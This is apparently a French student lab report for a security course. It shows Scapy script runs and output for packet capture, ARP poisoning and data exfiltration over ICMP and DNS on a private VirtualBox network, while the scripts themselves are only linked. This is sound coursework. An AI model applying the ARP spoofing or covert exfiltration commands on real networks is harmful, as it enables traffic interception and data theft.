# TP4 SECU : Exfiltration

# Sommaire

- [Sommaire](#sommaire)
- [I. Getting started Scapy](#i-getting-started-scapy)
- [II. ARP Poisoning](#ii-arp-poisoning)
- [II. Exfiltration ICMP](#ii-exfiltration-icmp)
- [III. Exfiltration DNS](#iii-exfiltration-dns)

# I. Getting started Scapy

🌞 **`ping.py`**

[Script](./Scripts/ping.py)

```sh
$ sudo python3 ping.py
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
Answers :
 - QueryAnswer(query=<IP  frag=0 proto=icmp src=192.168.56.5 dst=192.168.56.1 |<ICMP  type=echo-request |>>, answer=<IP  version=4 ihl=5 tos=0x0 len=28 id=62475 flags= frag=0 ttl=64 proto=icmp chksum=0x957e src=192.168.56.1 dst=192.168.56.5 |<ICMP  type=echo-reply code=0 chksum=0x0 id=0x0 seq=0x0 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)
```

🌞 **`tcp_cap.py`**

[Script](./Scripts/tcp_cap.py)

```bash
$ sudo python3 tcp_cap.py
TCP SYN ACK reçu !
- Adresse IP src : 142.250.179.78
- Adresse IP dst : 10.0.2.15
- Port TCP src : 443
- Port TCP dst : 47168
```

🌞 **`dns_cap.py`**

[Script](./Scripts/dns_cap.py)

```bash
$ dig ynov.com

; <<>> DiG 9.19.17-1-Debian <<>> ynov.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54956
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;ynov.com.			IN	A

;; ANSWER SECTION:
ynov.com.		2	IN	A	104.26.11.233
ynov.com.		2	IN	A	172.67.74.226
ynov.com.		2	IN	A	104.26.10.233

;; Query time: 8 msec
;; SERVER: 192.168.1.1#53(192.168.1.1) (UDP)
;; WHEN: Tue Nov 28 18:52:33 CET 2023
;; MSG SIZE  rcvd: 85
```

En même temps : 

```bash
$ sudo python3 dns_cap.py
104.26.11.233 ; 172.67.74.226 ; 104.26.10.233 ;
```

🌞 **`dns_lookup.py`**

[Script](./Scripts/dns_lookup.py)

```bash
$ sudo python3 dns_lookup.py
104.26.10.233 ; 104.26.11.233 ; 172.67.74.226 ;
```

# II. ARP Poisoning

🌞 **`arp_poisoning.py`**

[Script](./Scripts/arp_poisoning.py)

Depuis la cible :

```bash
$ ip a | grep 'inet ' | grep vboxnet0
    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0
$ ip n s | grep 10.13.33.37
```

Depuis l'attaquant :

```bash
$ ip a | grep 'inet ' | grep eth0 
    inet 192.168.56.5/24 brd 192.168.56.255 scope global dynamic noprefixroute eth0
$ sudo python3 arp_poisoning.py   
poisoning ongoing...
```

Depuis la cible :

```bash
$ ip n s | grep 10.13.33.37
10.13.33.37 dev vboxnet0 lladdr de:ad:be:ef:ca:fe STALE
```

# II. Exfiltration ICMP

🌞 **`icmp_exf_send.py`**

[Script](./Scripts/icmp_exf_send.py)

```bash
$ sudo python3 icmp_exf_send.py 192.168.56.1 t
.
Sent 1 packets.
```

[Capture du ping.](./Captures/icmp_exfr_send.pcapng)

Contenu du ping en ascii : 
''NaE@À¨8À¨8ÿt

🌞 **`icmp_exf_rcv.py`**

[Script](./Scripts/icmp_exf_rcv.py)

```bash
$ sudo python3 icmp_exf_send.py 192.168.56.5 t
.
Sent 1 packets.
```

```bash
$ sudo python3 icmp_exf_rcv.py
t
```

# III. Exfiltration DNS

🌞 **`dns_exfiltration_send.py`**

[Script](./Scripts/dns_exfiltration_send.py)

```bash
$ sudo python3 dns_exfiltration_send.py 192.168.56.1 testing_this_test_to_test_my_test_oki
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
```

[Capture des requêtes DNS](./Captures/dns_exfiltration_test.pcapng)
